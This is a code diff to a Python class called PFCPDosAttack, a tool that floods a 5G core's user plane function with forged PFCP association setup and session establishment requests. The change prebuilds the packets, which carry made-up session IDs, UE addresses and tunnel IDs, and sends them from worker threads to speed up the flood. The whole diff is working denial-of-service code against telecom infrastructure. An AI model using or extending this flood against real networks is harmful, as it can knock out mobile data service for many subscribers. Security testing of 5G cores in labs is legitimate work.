@@ -164,6 +164,8 @@ class PFCPDosAttack:
         self.teid_counter = 1
         self.ue_base_addr = ipaddress.IPv4Address(ue_start_addr)
         self._ue_counter = 1
+        self.pfcp_association_packet_list = []
+        self.pfcp_establishment_packet_list = []
         self.verbose = False
         
     def new_ue_addr(self):
@@ -200,23 +202,33 @@ class PFCPDosAttack:
             self.teid_counter = 1
         return teid
     
+    def prepare_pfcp_session_establishment_flood(self, count):
+        print(f"[DoS] Preparing {count} PFCP session establishment packets")
+        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
+        for i in range(count):
+            self.pfcp_association_packet_list.append(pfcp_obj.Build_PFCP_association_setup_req())
+            self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
+                seid=self.new_seid(), 
+                ue_addr=self.new_ue_addr(),
+                teid=self.new_teid()))
+        print(f"[DoS] Prepared {count} PFCP association setup packets")
+        print(f"[DoS] Prepared {count} PFCP session establishment packets")
+                
+    
     def pfcp_session_establishment_flood_worker(self, count):
         if self.verbose:
             print(f"[DoS][Worker] Worker starts flooding with {count} requests")
-        ezpfcp = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=False)
+        
         
         for i in range(count):
-            ezpfcp.Send_PFCP_association_setup_req()
-            
-            ezpfcp.Send_PFCP_session_establishment_req(
-                seid=self.new_seid(), 
-                ue_addr=self.new_ue_addr(),
-                teid=self.new_teid())
+            send(self.pfcp_association_packet_list[i])
+            send(self.pfcp_establishment_packet_list[i])
         if self.verbose:
             print(f"[DoS][Worker] Worker finished flooding with {count} requests")
 
     
     def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
+        self.prepare_pfcp_session_establishment_flood(reqNbr)
         if self.verbose:
             print(f"[DoS] Starting PFCP session establishment flood with {reqNbr} requests and {num_threads} threads")
         
